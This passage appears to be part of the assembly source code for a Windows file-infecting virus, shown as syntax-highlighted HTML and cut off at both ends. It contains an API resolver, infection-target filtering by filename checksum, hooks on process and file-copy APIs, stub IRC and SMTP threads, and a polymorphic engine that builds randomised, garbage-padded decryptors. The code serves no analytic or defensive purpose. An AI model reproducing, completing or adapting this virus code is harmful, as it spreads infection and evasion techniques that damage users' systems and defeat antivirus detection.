                                                </span><span class="sc1">;ebx points to image base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;eax points to ordinals array</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">;edx*2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;ordinal</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;funcs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;***        mov     eax,ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">oldedi</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;..:</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;reset counter</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NOF</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">searchname</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     Inet Thread     ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">startthreads</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ThreadHandle1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;IRC</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;this code starts the INET</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;services thread which stays</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;running until the host</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InetThread1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;terminates...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ThreadHandle2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;SMTP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InetThread2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iCreateThread</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     The IRC thread  ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">InetThread1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">thread1delta</span><span class="sc0">
</span><span class="sc5">thread1delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">thread1delta</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     The SMTP thread ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">InetThread2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">thread2delta</span><span class="sc0">
</span><span class="sc5">thread2delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">thread2delta</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">donotemailus</span><span class="sc0">

        </span><span class="sc6">nop</span><span class="sc0">
        
</span><span class="sc5">donotemailus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     Checks if it is safe to infect file ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">checkname</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
</span><span class="sc5">searchdot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">searchdot</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">std</span><span class="sc0">
</span><span class="sc5">searchslash</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">searchslash</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">upcase</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">done</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'z'</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">ok</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">ok</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">upcase</span><span class="sc0">
</span><span class="sc5">done</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crc32</span><span class="sc0">                           </span><span class="sc1">;ebx &lt;- CRC32</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">fnamecrc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">checkednames</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">checkednames</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check</span><span class="sc0">                           </span><span class="sc1">;if eax = 0, end of crc32s was</span><span class="sc0">
                                                </span><span class="sc1">;reached, so name is ok.</span><span class="sc0">
</span><span class="sc5">checkednames</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     When the host calls a hooked api it gets somewhre in here ***</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">apihooks</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">HOOKEDCreateProcessA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HookHandler</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">iCreateProcessA</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">HOOKEDCopyFileA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HookHandler</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">iCopyFileA</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">HOOKEDCreateFileA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HookHandler</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">iCreateFileA</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">HOOKEDMoveFileA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HookHandler</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">iMoveFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">HookOffsetsTable</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOOKEDCreateProcessA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOOKEDCopyFileA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOOKEDCreateFileA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOOKEDMoveFileA</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">HookHandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">nexxxt</span><span class="sc0">
</span><span class="sc5">nexxxt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nexxxt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">02ch</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;last pushed offset = file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iBeep</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HookDelta</span><span class="sc0">
</span><span class="sc5">HookDelta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookDelta</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       *** POLYMORFIC engine which generates decrypter &amp; encrypts code ***</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The generated code will look like this:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; pushad</span><span class="sc0">
</span><span class="sc1">; lea RegUsedAsPointer,[eax+placewherecryptedcodestarts]</span><span class="sc0">
</span><span class="sc1">; mov keyregister,randomvalue</span><span class="sc0">
</span><span class="sc1">; sub keyregister,randomvalue</span><span class="sc0">
</span><span class="sc1">; mov counterreg,size</span><span class="sc0">
</span><span class="sc1">; again:</span><span class="sc0">
</span><span class="sc1">; mov tempregister,[RegUsedAsPointer]</span><span class="sc0">
</span><span class="sc1">; xor tempregister,keyregister</span><span class="sc0">
</span><span class="sc1">; mov [RegUsedAsPointer],tempregister</span><span class="sc0">
</span><span class="sc1">; add RegUsedAsPointer,4</span><span class="sc0">
</span><span class="sc1">; dec counterreg</span><span class="sc0">
</span><span class="sc1">; pushf</span><span class="sc0">
</span><span class="sc1">; popf</span><span class="sc0">
</span><span class="sc1">; jz  exit</span><span class="sc0">
</span><span class="sc1">; jmp again</span><span class="sc0">
</span><span class="sc1">; exit:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; between each instruction some random code is putted.</span><span class="sc0">

</span><span class="sc5">CreatePoly</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc1">;--------PUSHAD--</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                  </span><span class="sc1">;pushad</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc1">;--------MOV-----</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

</span><span class="sc5">getregforoffset</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;This reg will contain the offset of code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;do not use ESP</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforoffset</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">;do not use EBP (!)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforoffset</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;backup register for offset code</span><span class="sc0">



        </span><span class="sc1">;--LEA reg,[EAX+x]-             ;lea</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;save location for patch</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;doesn't matter what we store</span><span class="sc0">
        </span><span class="sc1">;------------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">
      

</span><span class="sc5">getregforkey</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;This reg will contain the crypt key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;do not use ESP</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforkey</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;do not use ECX</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforkey</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforkey</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;backup register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc1">;--------MOV-----</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">;make a MOV reg, rndvalue</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;backup key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;register back in ah</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc1">;--------SUB-----</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">                 </span><span class="sc1">;make a SUB reg, rndvalue</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;Save the cryptkey</span><span class="sc0">

        
</span><span class="sc5">getregforsize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;do not use ESP</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforsize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;nor keyreg</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforsize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">;nor offsetreg</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforsize</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc1">;----MOVSIZE-----               ;mov ecx,virussize (size to decrypt)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virusz</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc1">;    AT THIS POINT IS EDI THE OFFSET FOR THE JMP</span><span class="sc0">

